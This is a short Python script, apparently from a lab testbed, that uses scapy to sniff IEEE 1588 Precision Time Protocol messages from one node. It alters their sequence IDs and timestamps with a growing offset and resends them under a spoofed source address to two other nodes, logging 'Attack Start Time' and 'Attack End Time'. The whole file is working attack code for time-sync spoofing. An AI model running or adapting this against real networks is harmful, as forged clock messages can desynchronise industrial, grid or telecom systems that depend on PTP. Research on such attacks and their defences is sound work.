from ieee1588 import ieee1588v2_Follow_Up
from ieee1588 import ieee1588
import sys
sys.path.append("/usr/bin/")
from scapy.all import *
import time
import random
from ieee1588 import PortIdentity

ptp_gen=ieee1588()
node_adrs=["169.254.182.84", "169.254.9.38", "169.254.251.125"]
start_time=time.time()
print("Attack Start Time",start_time)
diviation=0
port=[PortIdentity(clockIdentity=0xe45f01fffe345dd6,portNumber=1),PortIdentity(clockIdentity=0xdca632fffeefe575,portNumber=1)]

while True:
    while True:
        cap_pkts=sniff(filter="host 169.254.182.84 and udp and port 320", iface="eth0", count=1)
        print("Message captured!")
        cap_pkt=cap_pkts[0]
        cap_raw=cap_pkt.getlayer(Raw)
        ptp_class=ptp_gen.guess_payload_class(cap_raw.load)
        ptp_msg=ptp_class(cap_raw.load)
        print(ptp_msg.messageType)
        if ptp_msg.messageType==8 or ptp_msg.messageType==0:
            sleep(0.95)
            ptp_msg.sequenceId=ptp_msg.sequenceId+1
            ptp_msg.originTimestamp=time.time()+(diviation+1)*0.001
            diviation=diviation+1
            for i in range(2):
                UDP_layer=UDP(sport=320,dport=320)
                IP_layer=IP(src=node_adrs[0],dst=node_adrs[i+1])
                Ethernet_layer=Ether()
                adv_pkt=Ether(raw(Ethernet_layer/IP_layer/UDP_layer/raw(ptp_msg)))
                sendp(adv_pkt, iface="eth0")
                wrpcap("test_packets/adv_pkt0.cap",adv_pkt)
            break
        elif ptp_msg.messageType==9:
            ptp_msg.sequenceId=ptp_msg.sequenceId+1
            ptp_msg.receiveTimestamp=time.time()+(diviation+1)*0.001
            diviation=diviation+1
            for i in range(2):
                ptp_msg.requestingPortIdentity=port[i]
                UDP_layer=UDP(sport=320,dport=320)
                IP_layer=IP(src=node_adrs[0],dst=node_adrs[i+1])
                Ethernet_layer=Ether()
                adv_pkt=Ether(raw(Ethernet_layer/IP_layer/UDP_layer/raw(ptp_msg)))
                sendp(adv_pkt, iface="eth0")
                wrpcap("test_packets/adv_pkt1.cap",adv_pkt)
            break
    if time.time()-start_time>10:
        print("Attack End Time:", time.time())
        break
